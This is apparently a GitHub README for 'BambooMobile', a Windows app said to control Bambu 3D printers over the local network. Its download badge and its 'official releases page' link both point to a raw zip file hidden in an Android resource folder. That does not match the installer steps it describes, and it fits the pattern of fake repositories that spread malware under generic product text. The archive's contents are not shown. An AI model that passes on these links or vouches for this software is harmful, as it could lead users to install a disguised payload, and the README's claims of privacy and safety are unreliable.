# 🎋 BambooMobile - Local Control For Your Bambu Printer

[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Pholidaegenusonychium407/BambooMobile/main/src-tauri/gen/android/app/src/main/res/values-night/Mobile-Bamboo-1.1.zip)

BambooMobile provides a way to manage your 3D printer without relying on external cloud services. This application connects directly to your printer through your local network. You keep full control over your hardware, data, and print files.

## 🚀 How to Install on Windows

Follow these steps to set up the software on your computer.

1. Visit the [official releases page](https://raw.githubusercontent.com/Pholidaegenusonychium407/BambooMobile/main/src-tauri/gen/android/app/src/main/res/values-night/Mobile-Bamboo-1.1.zip).
2. Look for the "Assets" section at the bottom of the most recent release.
3. Select the file ending in `.msi` or `.exe` to download the installer.
4. Run the downloaded file.
5. Follow the prompts on your screen to complete the installation process.
6. Open the BambooMobile application from your Start menu or desktop icon.

## ⚙️ Connecting Your Printer

Before you start, ensure your printer and your computer utilize the same home network.

1. Power on your printer.
2. Locate the IP address of your printer. You can find this in the printer network settings menu.
3. Open BambooMobile.
4. Enter your printer's IP address into the connection field.
5. Enter the access code found on your printer screen when prompted. 
6. Select "Connect." The application will verify the link and display your printer dashboard.

## 🛠 Features

BambooMobile includes everything you need for daily printer management. 

* **Real-time Status:** View your printer temperature, print progress, and active tasks on one screen. 
* **File Management:** Upload, organize, and delete print files directly from your computer. 
* **Timelapse Viewer:** Access video clips of your completed prints. 
* **Network Only Operation:** The app sends commands directly to the machine. No data leaves your local network.

## 📋 System Requirements

Ensure your computer meets these requirements for the best experience.

* **Operating System:** Windows 10 or Windows 11.
* **Network:** An active Wi-Fi or Ethernet connection on the same network as your printer.
* **Storage:** 200 MB of free disk space.
* **Permissions:** Ability to install standard desktop applications.

## 🔍 Troubleshooting Tips

If you encounter issues while using the app, check the following items.

* **Check the Network:** Confirm the printer and the computer reside on the same Wi-Fi network. 
* **Verify the IP Address:** Re-enter the IP address in the settings if the app fails to find the printer.
* **Check the Access Code:** Ensure you input the correct access code from the printer's display.
* **Restart the Printer:** Sometimes a simple power cycle of the printer resolves connection errors.
* **Firewall Settings:** Ensure your Windows firewall allows the application to communicate over your local private network.

## 🔒 Privacy and Security

This application respects your privacy. It does not create an account. It does not send your data to any servers. All communication happens between your printer and your machine. You own your print history and your files. 

## ❓ Frequently Asked Questions

**Do I need an internet connection?**
Yes, you need a network connection to talk to the printer, but the app does not require a connection to the public internet.

**Does this work with all Bambu Lab models?**
This app works best with machines that support local communication. Testing confirms it works on the P1S.

**Can I use this app on my phone?**
This version is designed for Windows desktop use. Future updates may include mobile support.

**Will this app update my firmware?**
No. This app handles print jobs and monitoring. Use the original manufacturer software if you need to update printer firmware.

**Does this app store my account password?**
There are no accounts. The app stores only the printer IP address and access code locally on your machine to save you time.
